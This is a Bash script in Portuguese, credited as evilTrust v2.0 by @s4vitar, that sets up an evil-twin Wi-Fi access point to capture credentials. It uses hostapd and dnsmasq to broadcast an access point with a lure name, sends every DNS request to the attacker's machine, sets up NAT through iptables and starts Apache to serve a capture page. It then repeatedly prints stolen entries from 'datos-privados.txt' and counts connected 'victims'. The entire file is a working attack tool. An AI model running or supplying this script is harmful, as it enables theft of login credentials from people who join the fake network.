#!/bin/bash

# evilTrust v2.0, Autor @s4vitar (Marcelo Vázquez)

# Cores
corVerde="\e[0;32m\033[1m"
corFim="\033[0m\e[0m"
corVermelha="\e[0;31m\033[1m"
corAzul="\e[0;34m\033[1m"
corAmarela="\e[0;33m\033[1m"
corRoxa="\e[0;35m\033[1m"
corTurquesa="\e[0;36m\033[1m"
corCinza="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
        echo -e "\n\n${corAmarela}[*]${corFim}${corCinza} Saindo...\n${corFim}"
        rm dnsmasq.conf hostapd.conf 2>/dev/null
        rm -r iface 2>/dev/null
        find \-name datos-privados.txt | xargs rm 2>/dev/null
        sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
        iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
        ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
        tput cnorm; service network-manager restart
        exit 0
}

function dependencies(){
    sleep 1.5
    counter=0
    echo -e "\n[*] Verificando programas necessários...\n"
    sleep 1

    dependencias=(php dnsmasq hostapd)

    for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
            echo -e ". . . . . . . . [V] A ferramenta $programa está instalada"
            let counter+=1
        else
            echo -e "[X] A ferramenta $programa não está instalada"
        fi
        sleep 0.4
    done

    if [ "$(echo $counter)" == "3" ]; then
        echo -e "\n[*] Iniciando...\n"
        sleep 3
    else
        echo -e "[!] É necessário ter as ferramentas php, dnsmasq e hostapd instaladas para executar este script\n"
        tput cnorm
        exit
    fi
}

function getCredentials(){
    activeHosts=0
    tput civis
    while true; do
        echo -e "\n[*] Aguardando credenciais (Pressione Ctrl+C para finalizar)...\n"
        for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
        echo -e "Vítimas conectadas: $activeHosts\n"
        find -name datos-privados.txt | xargs cat 2>/dev/null
        for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
        activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
        sleep 3
        clear
    done
}

function startAttack(){
    clear
    if [[ -e credenciales.txt ]]; then
        rm -rf credenciales.txt
    fi

    echo -e "\n[*] Listando interfaces de rede disponíveis..."
    sleep 1

    airmon-ng start wlan0 > /dev/null 2>&1
    interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
    counter=1

    for interface in $(cat iface); do
        echo -e "\t\n$counter. $interface"
        let counter++
    done

    tput cnorm
    checker=0

    while [ $checker -ne 1 ]; do
        echo -ne "\n[*] Nome da interface (Ex: wlan0mon): " && read choosed_interface

        for interface in $(cat iface); do
            if [ "$choosed_interface" == "$interface" ]; then
                checker=1
            fi
        done

        if [ $checker -eq 0 ]; then
            echo -e "\n[!] A interface fornecida não existe"
        fi
    done

    rm iface 2>/dev/null
    echo -ne "\n[*] Nome do ponto de acesso a ser utilizado (Ex: wifiGratis): " && read -r use_ssid
    echo -ne "[*] Canal a ser utilizado (1-12): " && read use_channel
    tput civis
    echo -e "\n[!] Encerrando todas as conexões...\n"
    sleep 2
    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5

    echo -e "interface=$choosed_interface\n" > hostapd.conf
    echo -e "driver=nl80211\n" >> hostapd.conf
    echo -e "ssid=$use_ssid\n" >> hostapd.conf
    echo -e "hw_mode=g\n" >> hostapd.conf
    echo -e "channel=$use_channel\n" >> hostapd.conf
    echo -e "macaddr_acl=0\n" >> hostapd.conf
    echo -e "auth_algs=1\n" >> hostapd.conf
    echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

    echo -e "[*] Configurando a interface $choosed_interface\n"
    sleep 2
    echo -e "[*] Iniciando o hostapd..."
    hostapd hostapd.conf > /dev/null 2>&1 &
    sleep 6

    echo -e "\n[*] Configurando o dnsmasq..."
    echo -e "interface=$choosed_interface\n" > dnsmasq.conf
    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
    echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
    echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
    echo -e "server=8.8.8.8\n" >> dnsmasq.conf
    echo -e "log-queries\n" >> dnsmasq.conf
    echo -e "log-dhcp\n" >> dnsmasq.conf
    echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
    echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

    ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
    sleep 1
    echo -e "[*] Iniciando o dnsmasq..."
    dnsmasq -C dnsmasq.conf > /dev/null 2>&1 &
    sleep 2

    echo -e "\n[*] Habilitando o IP Forwarding..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
    sleep 2

    echo -e "[*] Configurando o iptables..."
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    iptables -P FORWARD ACCEPT
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    iptables -A FORWARD -i $choosed_interface -j ACCEPT

    echo -e "\n[*] Iniciando o serviço DHCP..."
    dhcpd $choosed_interface > /dev/null 2>&1 &
    sleep 2

    echo -e "[*] Iniciando o serviço Apache2..."
    service apache2 start > /dev/null 2>&1
    sleep 2

    clear
    echo -e "[*] Tudo configurado e pronto para a captura de credenciais!\n"
    getCredentials
}

dependencies
startAttack
